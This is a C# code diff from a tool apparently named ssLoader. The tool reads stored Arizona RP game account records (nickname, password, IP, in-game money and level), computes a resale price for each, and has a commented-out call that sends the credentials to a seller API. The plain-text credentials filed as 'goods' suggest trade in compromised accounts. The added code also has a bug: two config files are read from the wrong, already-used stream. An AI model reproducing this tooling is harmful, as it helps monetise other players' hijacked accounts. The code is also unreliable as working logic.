@@ -12,38 +12,62 @@ namespace ssLoader.Arizona
     {
         private string getCurrDir = Directory.GetCurrentDirectory();
         private readonly Money money = new Money();
-        public async Task ArizonaSender(string path)
+        int successArizona = 0;
+
+        private int countPrice(float money, int lvl, int startprice, int typeMoney, int typeLevel)
+        {
+            var moneyCount = (money / 1000000.0) * typeMoney;
+            var levelCount = lvl * typeLevel;
+            int result = startprice + levelCount + (int)moneyCount;
+            return result;
+        }
+
+        public async Task SendToSS(string path)
         {
             try
             {
                 #region создание экземпляров классов
-                var arzSend = new AccountSender();
                 var getAccounts = new GetAccounts();
                 var accountSender = new AddAccount();
-                var config = new Config();
+               // var config = new Json.Config();
+                //var priceLevel = new Level();
+                //var priceStart = new StartPrice();
                 #endregion
 
                 #region Десериализация json файлов
                 using FileStream api_key = File.OpenRead(@$"{getCurrDir}\Config\Config.json");
-                var jsonConfig = await JsonSerializer.DeserializeAsync<Config>(api_key);
+                var jsonConfig = await JsonSerializer.DeserializeAsync<Json.Config>(api_key);
+
                 using FileStream openStream = File.OpenRead(@$"{getCurrDir}\Config\Money.json");
                 var moneyPrice = await JsonSerializer.DeserializeAsync<Money>(openStream);
+
+                using FileStream levelPriceJson = File.OpenRead(@$"{getCurrDir}\Config\Levels.json");
+                var levelPrice = await JsonSerializer.DeserializeAsync<Level>(openStream);
+
+                using FileStream startPriceJson = File.OpenRead(@$"{getCurrDir}\Config\StartPrice.json");
+                var startPrice = await JsonSerializer.DeserializeAsync<StartPrice>(openStream);
                 #endregion
 
                 #region ArizonaRP
-                var arizonaFormat = new ArizonaFormat();
+               // var arizonaFormat = new ArizonaFormat();
                 var brainburgGoods = getAccounts.CheckNameArizonaBrainburg(path);
                 var main = new Main();
                 foreach (var ARZ in brainburgGoods)
                 {
-                    var text = File.ReadAllText($@"{path}\Arizona RP\Brainburg\goods\{ARZ}.json");
-                    var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
-                   /* var text1 = File.ReadAllText($@"C:\Users\Fesenko.AP\source\repos\BUTCHERS228\ssLoader\bin\Debug\net5.0-windows\Config\Config.json");
-                    var result1 = JsonSerializer.Deserialize<Config>(text1);*/
-                    var priceMoney = (result.money / 1000000.0) * moneyPrice.ArizonaRP;
-                    main.richTextBox1.Text += $"[ARZ Brainburg] {result.nick} | {result.lvl} уровень | {result.money}$ на руках";
-                   // await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
-                }/*
+                    if (File.Exists($@"{path}\Arizona RP\Brainburg\goods\{ARZ}.json"))
+                    {
+                        var text = File.ReadAllText($@"{path}\Arizona RP\Brainburg\goods\{ARZ}.json");
+                        var result = JsonSerializer.Deserialize<ArizonaFormat>(text.Replace("\r\n", ""));
+                        /* var text1 = File.ReadAllText($@"C:\Users\Fesenko.AP\source\repos\BUTCHERS228\ssLoader\bin\Debug\net5.0-windows\Config\Config.json");
+                         var result1 = JsonSerializer.Deserialize<Config>(text1);*/
+                        var price = countPrice(result.money, result.lvl, startPrice.ArizonaRP, moneyPrice.ArizonaRP, levelPrice.ArizonaRP);
+                        MessageBox.Show($"{result.nick} ник | {result.money} | цена акк {price}");
+                        successArizona++;
+                    }
+                    // await Task.Run(() => accountSender.SendApi(jsonConfig.api_key, result.ip, 10 + (int)priceMoney, null, result.nick, result.password, "", "хорошего дня :)", $"{result.lvl} уровень | {result.money}$ на руках"));
+                }
+                //main.setLabelTextFromThread(main.label1, "asd");
+                /*
                 var ChandlerGoods = getAccounts.CheckNameArizonaChandler(path);
                 foreach (var ARZ in ChandlerGoods)
                 {
@@ -188,7 +212,7 @@ namespace ssLoader.Arizona
             }
             finally
             {
-                MessageBox.Show("Я все");
+                MessageBox.Show($"Я все {successArizona}");
             }
         }
     }
